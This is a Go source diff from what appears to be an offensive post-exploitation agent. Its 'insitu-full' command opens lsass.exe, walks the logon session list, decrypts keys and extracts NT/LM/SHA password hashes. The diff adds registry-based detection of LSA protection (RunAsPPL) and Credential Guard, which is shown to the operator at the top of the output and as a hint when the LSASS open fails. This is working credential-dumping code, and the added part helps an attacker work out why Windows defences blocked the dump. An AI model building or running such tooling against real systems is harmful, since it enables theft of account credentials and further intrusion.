@@ -141,6 +141,7 @@ type insituFullDecryptedReport struct {
 // decryption + plaintext NT/LM/SHA extraction).
 type insituFullSummary struct {
 	Phase1SessionCount       int                    `json:"phase1_session_count"`
+	LsassProtection          *insituFullProtectionReport `json:"lsass_protection,omitempty"`
 	LSASSPID                 uint32                 `json:"lsass_pid"`
 	LsasrvBase               string                 `json:"lsasrv_base"`
 	LsasrvSize               uint32                 `json:"lsasrv_size"`
@@ -159,6 +160,39 @@ type insituFullSummary struct {
 	HashesExtracted          int                    `json:"hashes_extracted"`
 	UnmatchedLUIDs           []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
 	Nodes                    []insituFullNodeReport `json:"nodes"`
+}
+
+// insituFullProtectionReport is the JSON projection of the LSA protection
+// state read from the registry by detectLsassProtection(). Surfaced at the
+// top of every insitu-full run so layout drift is distinguishable from
+// "OpenProcess(LSASS) failed because the kernel rejected PROCESS_VM_READ
+// from a non-PPL caller".
+type insituFullProtectionReport struct {
+	RunAsPPL                 string `json:"run_as_ppl"`
+	RunAsPPLDetected         bool   `json:"run_as_ppl_detected"`
+	RunAsPPLValue            uint32 `json:"run_as_ppl_value"`
+	LsaCfgFlags              string `json:"lsa_cfg_flags"`
+	LsaCfgFlagsDetected      bool   `json:"lsa_cfg_flags_detected"`
+	LsaCfgFlagsValue         uint32 `json:"lsa_cfg_flags_value"`
+	PPLActive                bool   `json:"ppl_active"`
+	CredentialGuardActive    bool   `json:"credential_guard_active"`
+	Summary                  string `json:"summary"`
+	RegistryError            string `json:"registry_error,omitempty"`
+}
+
+func newProtectionReport(s LsassProtectionState) *insituFullProtectionReport {
+	return &insituFullProtectionReport{
+		RunAsPPL:              s.RunAsPPLLabel(),
+		RunAsPPLDetected:      s.RunAsPPLDetected,
+		RunAsPPLValue:         s.RunAsPPL,
+		LsaCfgFlags:           s.LsaCfgFlagsLabel(),
+		LsaCfgFlagsDetected:   s.LsaCfgFlagsDetected,
+		LsaCfgFlagsValue:      s.LsaCfgFlags,
+		PPLActive:             s.PPLActive(),
+		CredentialGuardActive: s.CredentialGuardActive(),
+		Summary:               s.Summary(),
+		RegistryError:         s.Error,
+	}
 }
 
 // insituFullCryptoReport is the JSON projection of the Phase 2C-ii-b key
@@ -221,14 +255,20 @@ func executeInsituFull() structs.CommandResult {
 		luidsOrdered = append(luidsOrdered, luid)
 	}
 
-	// Step 2: Open LSASS.
+	// Step 2: Detect LSASS protection state (PPL / Credential Guard) from
+	// the registry. Best-effort, never aborts — the goal is to give the
+	// operator a concrete reason when OpenProcess fails on the next line.
+	protection := detectLsassProtection()
+
+	// Step 2b: Open LSASS.
 	pid, err := lsassFindPID()
 	if err != nil {
 		return errorf("Phase 2B: locate lsass.exe: %v", err)
 	}
 	h, err := lsassOpenForRead(pid)
 	if err != nil {
-		return errorf("Phase 2B: open lsass.exe pid=%d: %v", pid, err)
+		return errorf("Phase 2B: open lsass.exe pid=%d: %v\n[!] Detected protection state: %s\n[!] %s",
+			pid, err, protection.Summary(), protection.AccessDeniedHint())
 	}
 	defer windows.CloseHandle(h)
 
@@ -426,6 +466,7 @@ func executeInsituFull() structs.CommandResult {
 
 	summary := insituFullSummary{
 		Phase1SessionCount:       len(phase1),
+		LsassProtection:          newProtectionReport(protection),
 		LSASSPID:                 pid,
 		LsasrvBase:               fmt.Sprintf("0x%X", mod.Base),
 		LsasrvSize:               mod.Size,
@@ -453,6 +494,7 @@ func executeInsituFull() structs.CommandResult {
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
+	sb.WriteString(fmt.Sprintf("[+] LSASS protection: %s\n", protection.Summary()))
 	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
 	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
 	if walkErr != nil {
